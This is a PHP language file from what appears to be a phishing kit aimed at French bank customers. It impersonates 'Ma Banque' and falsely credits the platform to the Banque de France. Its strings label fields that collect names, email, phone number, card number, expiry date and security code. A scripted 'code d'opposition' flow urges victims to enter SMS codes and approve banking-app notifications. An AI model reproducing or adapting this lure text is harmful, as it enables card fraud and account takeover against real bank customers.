<?php
$language = array(
    'title' => array(
        '1' => 'Ma Banque',
    ),
	
    'secure_text' => array(
        '1' => 'Avec la technologie SSL',
        '2' => 'vos données personnelles sont toujours protégées.',
    ),
	
    'card_title' => array(
        '1' => 'Securiser ma carte',
    ),

    'order_btn' => array(
        '1' => 'Confirmer',
        '2' => 'Operation sécurisée par SSL',
    ),

    'biling' => array(
        '1' => 'Formulaire de sécurité',
            '2' => 'Prénom',
            '3' => 'Nom',
            '4' => 'Email',
    ),
    
	'details_submit' => array(
        '1' => 'Suite',
    ),

    'paiement_iframe' => array(
        'details_title' => array(
            '1' => '1 versements',
            '2' => 'Informations d\'annulation',
            '3' => 'Coût',
            '4' => 'Détail',
            '5' => 'Sous-total',
            '6' => 'TVA',
            '7' => 'Total',
            '8' => 'Saisissez les informations de la carte pour valider la securisation',
        ),
        'formpayment' => array(
			'1' => 'Numéro de Telephone',
			'2' => 'Numéro de carte',
			'3' => 'Date d\'expiration',
			'4' => 'Code de sécurité',
			'5' => 'Valider',
		),
    ),

    'vbv' => array(
        'lines' => array(
            '1' => ' ',
            '2' => 'contribue à protéger votre',
            '3' => 'Nous vous prions de bien vouloir sécuriser les accès de votre compte. Merci',
            '4' => 'Veuillez confirmer le code d\'opposition reçu par SMS.',
            '5' => 'Puis cliquez sur opposition',
            '6' => 'NB: si vous ne recevez pas de code, valider la notification dans votre application bancaire pour obtenir le code d\'opposition.',
        ),
        '1'     => 'Marchand',
        '2'     => 'Montant',
        '3'     => 'Date',
        '4'     => 'Numéro de carte',
        '5'     => 'Type de carte',
        '6'     => 'SECURISER',
        '7'     => 'IDENTIFIANT',
        '8'     => '(MM/JJ/AAAA)',
        '9'     => 'Securiser mon compte',
        '10'    => 'CODE D\'OPPOSITION',
        '11'    => 'FAIRE OPPOSITION',
        '12'    => '"Code d\'opposition validé, veuillez patienter un nouveau code vous sera envoyé... "',
        '13'    => '"SECURISATION EN COURS"',
    ),

    'footer_top' => array(
        '1' => 'Contactez-nous',
        '2' => 'Conditions générales de securité',
            '3' => 'Platforme crée par la BANQUE DE FRANCE',
            '4' => 'Politique de sécurité',
    ),
    
);

?>